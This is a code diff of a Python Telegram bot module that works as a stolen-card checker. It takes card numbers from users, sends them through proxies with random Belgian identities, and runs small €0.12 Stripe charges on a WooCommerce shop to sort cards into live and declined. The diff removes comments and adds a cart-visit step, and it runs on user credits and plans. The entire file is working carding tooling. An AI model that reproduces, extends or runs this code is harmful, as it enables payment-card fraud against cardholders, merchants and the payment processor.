             guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
             
-            # FIX: Use stripe_mid and stripe_sid from cookies, or generate fallbacks
             muid = self.stripe_mid or f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
             sid = self.stripe_sid or f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
             
-            # FIX: Generate wallet_config_id as in network data
             wallet_config_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
-            
-            # FIX: Generate client_session_id
             client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
 
             payment_data = {
@@ -1341,7 +1235,6 @@ class StripeCharge012Checker:
                 "Sec-Fetch-Site": "cross-site",
             }
 
-            # Use separate client for Stripe (no proxy needed for Stripe API)
             async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                 response = await stripe_client.post(
                     "https://api.stripe.com/v1/payment_methods",
@@ -1370,11 +1263,10 @@ class StripeCharge012Checker:
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
 
     async def process_checkout(self, user_info, payment_method_id):
-        """Process checkout with detailed logging"""
+        """Process checkout"""
         try:
-            logger.step(6, 6, "Processing checkout...")
+            logger.step(7, 7, "Processing checkout...")
 
-            # Build checkout data (from network data format)
             checkout_data = {
                 'wc-ajax': 'checkout',
                 'wc_order_attribution_source_type': 'typein',
@@ -1441,7 +1333,6 @@ class StripeCharge012Checker:
 
             if response.status_code != 200:
                 logger.error(f"Checkout failed with status: {response.status_code}")
-                # Try to extract error from response body
                 error_msg = self.extract_error_from_html(response_text)
                 return {
                     'success': False,
@@ -1449,14 +1340,12 @@ class StripeCharge012Checker:
                     'message': error_msg if error_msg != "Payment declined" else f"Server error: {response.status_code}"
                 }
 
-            # Try to parse JSON response
             try:
                 result = response.json()
 
                 if isinstance(result, dict):
-                    # CHECK: If this is a 3D Secure or deferred payment
                     if self.is_secure_required_response(result):
-                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
+                        logger.warning("🔐 3D Secure/Deferred payment detected")
                         return {
                             'success': True,
                             'status': 'DECLINED',
@@ -1466,9 +1355,8 @@ class StripeCharge012Checker:
                     if result.get('result') == 'success' and result.get('redirect'):
                         redirect_url = result.get('redirect', '').lower()
 
-                        # If redirect contains confirmation patterns, it's likely 3D Secure
                         if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
-                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
+                            logger.warning("⚠️ Success with confirmation URL - 3D SECURE")
                             return {
                                 'success': True,
                                 'status': 'DECLINED',
@@ -1493,7 +1381,6 @@ class StripeCharge012Checker:
                         clean_error = self.extract_error_from_html(error_msg)
                         logger.warning(f"Extracted error: {clean_error}")
 
-                        # Check for 3D Secure in error message
                         if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                             logger.warning("🔐 3D Secure authentication required")
                             return {
@@ -1502,7 +1389,6 @@ class StripeCharge012Checker:
                                 'message': '3D SECURE❎'
                             }
 
-                        logger.warning(f"❌ Checkout error: {clean_error}")
                         return {
                             'success': False,
                             'status': 'DECLINED',
@@ -1521,14 +1407,12 @@ class StripeCharge012Checker:
 
                 decline_message = self.extract_error_from_html(response_text)
                 if decline_message and decline_message != "Payment declined":
-                    logger.warning(f"Extracted error from HTML: {decline_message}")
                     return {
                         'success': False,
                         'status': 'DECLINED',
                         'message': decline_message
                     }
                 else:
-                    logger.warning("Could not extract error message from response")
                     return {
                         'success': False,
                         'status': 'DECLINED',
@@ -1544,7 +1428,7 @@ class StripeCharge012Checker:
             }
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method with proxy integration"""
+        """Main card checking method"""
         start_time = time.time()
         cc = mes = ano = cvv = ""
         bin_info = None
@@ -1552,7 +1436,7 @@ class StripeCharge012Checker:
         logger.info(f"🔍 Starting Stripe Charge €0.12 check")
 
         # Step 0: Get proxy for user
-        logger.step(0, 6, "Getting proxy...")
+        logger.step(0, 7, "Getting proxy...")
         
         if not PROXY_SYSTEM_AVAILABLE:
             logger.error("Proxy system not available")
@@ -1564,23 +1448,23 @@ class StripeCharge012Checker:
             self.proxy_status = "Dead 🚫"
             return await self.format_response("", "", "", "", "ERROR", "No proxy available", username, time.time()-start_time, user_data)
         
-        # VPS FIX: Create SSL context that allows all ciphers and protocols
+        # VPS FIX: Create SSL context
         ssl_context = ssl.create_default_context()
         ssl_context.check_hostname = False
         ssl_context.verify_mode = ssl.CERT_NONE
         ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
         
-        # VPS FIX: Initialize httpx client with HTTP/1.1 only and proper SSL
+        # VPS FIX: Initialize httpx client
         try:
             self.client = httpx.AsyncClient(
                 proxy=self.proxy_url,
                 timeout=httpx.Timeout(30.0, connect=15.0),
                 follow_redirects=True,
                 limits=httpx.Limits(max_keepalive_connections=1, max_connections=2),
-                verify=ssl_context,  # Use custom SSL context
-                http1=True,  # FORCE HTTP/1.1 - VPS FIX
-                http2=False,  # DISABLE HTTP/2 - VPS FIX
-                trust_env=False  # Ignore environment proxy settings - VPS FIX
+                verify=ssl_context,
+                http1=True,
+                http2=False,
+                trust_env=False
             )
         except Exception as e:
             logger.error(f"Failed to initialize HTTP client: {str(e)}")
@@ -1588,11 +1472,11 @@ class StripeCharge012Checker:
             mark_proxy_failed(self.proxy_url)
             return await self.format_response("", "", "", "", "ERROR", f"Client init failed: {str(e)}", username, time.time()-start_time, user_data)
         
-        # Test the proxy quickly with retry
+        # Test the proxy
         start_test = time.time()
         proxy_working = False
         
-        for test_attempt in range(2):  # Try twice to test proxy
+        for test_attempt in range(2):
             try:
                 test_resp = await self.client.get("https://ipinfo.io/json", timeout=10)
                 self.proxy_response_time = time.time() - start_test
@@ -1630,7 +1514,7 @@ class StripeCharge012Checker:
             return await self.format_response("", "", "", "", "ERROR", "Proxy connection failed", username, time.time()-start_time, user_data)
 
         try:
-            # Use intelligent parser to extract card details
+            # Parse card details
             parsed = parse_card_input(card_details)
             if not parsed:
                 return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)
@@ -1658,7 +1542,6 @@ class StripeCharge012Checker:
             # Get Belgium address
             address_info = random.choice(self.belgium_addresses)
             
-            # Generate random email if address doesn't have one or use the one from address
             if address_info.get('email'):
                 email = address_info['email']
             else:
@@ -1679,7 +1562,7 @@ class StripeCharge012Checker:
 
             logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")
 
-            # Step 1: Initialize session (with proxy and retry)
+            # Step 1: Initialize session
             if not await self.initialize_session():
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)
 
@@ -1688,24 +1571,27 @@ class StripeCharge012Checker:
             if not add_success:
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)
 
-            # Step 3: Load checkout page and extract nonces
+            # FIX: Step 3 - Visit cart page (NEW STEP)
+            await self.visit_cart_page()
+
+            # Step 4: Load checkout page
             checkout_success, checkout_error = await self.get_checkout_page()
             if not checkout_success:
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout page error: {checkout_error}", username, time.time()-start_time, user_data, bin_info)
 
-            # Step 4: Update order review with Belgium address and local pickup
+            # Step 5: Update order review
             update_success, update_result = await self.update_order_review(user_info)
             if not update_success:
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", update_result, username, time.time()-start_time, user_data, bin_info)
 
-            # Step 5: Create Stripe payment method
+            # Step 6: Create Stripe payment method
             payment_result = await self.create_stripe_payment_method((cc, mes, ano, cvv), user_info)
             if not payment_result['success']:
                 error_msg = payment_result['error']
                 logger.warning(f"Payment method creation failed: {error_msg}")
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
 
-            # Step 6: Process checkout
+            # Step 7: Process checkout
             result = await self.process_checkout(user_info, payment_result['payment_method_id'])
 
             elapsed_time = time.time() - start_time
@@ -1727,14 +1613,13 @@ class StripeCharge012Checker:
             logger.error(f"Unexpected error: {str(e)}")
             return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
         finally:
-            # Ensure client is closed
             if self.client:
                 try:
                     await self.client.aclose()
                 except:
                     pass
 
-# Command handler - FIXED: Only match exact /xx command, not /mxx
+# Command handler
 @Client.on_message(filters.command(["xx", ".xx", "$xx"]) & ~filters.command(["mxx", ".mxx", "$mxx"]))
 @auth_and_free_restricted
 async def handle_stripe_charge_012(client: Client, message: Message):
@@ -1742,7 +1627,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
 
-        # CHECK: First check if command is disabled
         command_text = message.text.split()[0]
         command_name = command_text.lstrip('/.$')
 
@@ -1750,7 +1634,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
             await message.reply(get_command_offline_message(command_text))
             return
 
-        # Check if user is banned
         if is_user_banned(user_id):
             await message.reply("""<pre>⛔ User Banned</pre>
 ━━━━━━━━━━━━━
@@ -1759,7 +1642,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Load user data
         users = load_users()
         user_id_str = str(user_id)
         if user_id_str not in users:
@@ -1774,7 +1656,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
         user_plan = user_data.get("plan", {})
         plan_name = user_plan.get("plan", "Free")
 
-        # Check cooldown (owner is automatically skipped in check_cooldown function)
         can_use, wait_time = check_cooldown(user_id, "xx")
         if not can_use:
             await message.reply(f"""<pre>⏳ Cooldown Active</pre>
@@ -1803,9 +1684,7 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 <b>~ Note:</b> <code>Stripe Charges €0.12</code>""")
             return
 
-        # Get the full message text after the command
         full_text = message.text
-        # Remove the command part
         command_parts = full_text.split(maxsplit=1)
         if len(command_parts) < 2:
             await message.reply("Please provide card details")
@@ -1813,7 +1692,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
         
         card_input = command_parts[1].strip()
 
-        # Parse using the intelligent parser
         parsed = parse_card_input(card_input)
         if not parsed:
             await message.reply("""<pre>❌ Invalid Format</pre>
@@ -1825,7 +1703,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 
         cc, mes, ano, cvv = parsed
 
-        # Check if proxy system is available
         if not PROXY_SYSTEM_AVAILABLE:
             await message.reply("""<pre>❌ Proxy System Unavailable</pre>
 ━━━━━━━━━━━━━
@@ -1834,7 +1711,6 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Show processing message
         processing_msg = await message.reply(
             charge_processor.get_processing_message(
                 cc, mes, ano, cvv, username, plan_name, 
@@ -1851,25 +1727,22 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 <b>Checking card... Please wait.</b>"""
         )
 
-        # Create checker instance
         checker = StripeCharge012Checker(user_id=user_id)
 
-        # Process command through universal charge processor
         if charge_processor:
             success, result, credits_deducted = await charge_processor.execute_charge_command(
-                user_id,                    # positional
-                checker.check_card,         # positional
-                card_input,                  # check_args[0]
-                username,                   # check_args[1]
-                user_data,                  # check_args[2]
-                credits_needed=2,           # keyword
-                command_name="xx",          # keyword
-                gateway_name="Stripe Charge €0.12"  # keyword
+                user_id,
+                checker.check_card,
+                card_input,
+                username,
+                user_data,
+                credits_needed=2,
+                command_name="xx",
+                gateway_name="Stripe Charge €0.12"
             )
 
             await processing_msg.edit_text(result, disable_web_page_preview=True)
         else:
-            # Fallback to old method if charge_processor not available
             result = await checker.check_card(card_input, username, user_data)
             await processing_msg.edit_text(result, disable_web_page_preview=True)
 
